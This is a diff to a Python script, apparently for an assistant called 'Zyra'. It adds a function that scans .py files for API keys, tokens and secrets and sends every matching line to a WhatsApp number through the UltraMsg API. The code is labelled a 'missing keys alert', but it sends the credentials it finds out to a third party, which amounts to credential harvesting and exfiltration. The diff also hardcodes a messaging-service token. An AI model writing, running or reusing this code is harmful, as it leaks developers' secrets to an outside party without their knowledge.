@@ -7,28 +7,46 @@ INSTANCE_ID = "instance126727"
 TOKEN = "2nmo6sl5l4ry94le"
 
 def send_whatsapp_message(number, message):
- url = f"https://api.ultramsg.com/{INSTANCE_ID}/messages/chat"
- payload = {"token": TOKEN, "to": number, "body": message}
- try:
-  res = requests.post(url, data=payload)
-  print("Message sent:", res.json())
- except Exception as e:
-  print("Error sending WhatsApp message:", e)
-
-def scan_code_for_keys(folder="."):
- keywords = ["api_key", "access_token", "client_id", "secret_key", "authorization", "bearer_token", "openai.api_key", "token"]
- key_usage = {}
- for root, dirs, files in os.walk(folder):
-  for file in files:
-   if file.endswith(".py"):
-    path = os.path.join(root, file)
+    url = f"https://api.ultramsg.com/{INSTANCE_ID}/messages/chat"
+    payload = {
+        "token": TOKEN,
+        "to": number,
+        "body": message
+    }
     try:
-     with open(path, "r", encoding="utf-8", errors="ignore") as f:
-      lines = f.readlines()
-      for kw in keywords:
-            if kw in line:
-                pattern = r"{}.*?[=:(\s]+[\"']?([\w\-]+)[\"']?".format(re.escape(kw))
-                match = re.search(pattern, line)
-                if match:
-                    value = match.group(1)
-                    key_usage.setdefault(kw, []).append((file, line.strip()))
+        res = requests.post(url, data=payload)
+        print("Message sent:", res.json())
+    except Exception as e:
+        print("Error sending WhatsApp message:", e)
+
+def run_api_key_scanner(folder="."):
+    keywords = [
+        "api_key", "access_token", "client_id", "secret_key", "authorization",
+        "bearer_token", "openai.api_key", "token"
+    ]
+    key_usage = {}
+
+    for root, dirs, files in os.walk(folder):
+        for file in files:
+            if file.endswith(".py"):
+                path = os.path.join(root, file)
+                try:
+                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                        lines = f.readlines()
+
+                    for line_number, line in enumerate(lines, 1):
+                        for kw in keywords:
+                            pattern = r"{}.*?[=:]['\"](.*?)['\"]".format(re.escape(kw))
+                            match = re.search(pattern, line)
+                            if match:
+                                value = match.group(1)
+                                key_usage.setdefault(kw, []).append((file, line.strip()))
+                except Exception as e:
+                    print(f"Error reading file {file}: {e}")
+
+    # Send missing keys alert
+    for kw, entries in key_usage.items():
+        message = f"Zyra: Mujhe {kw.upper()} API key chahiye, please bhejo.\n"
+        for file, line in entries:
+            message += f"📂 {file} -> {line}\n"
+        send_whatsapp_message(WHATSAPP_NUMBER, message)
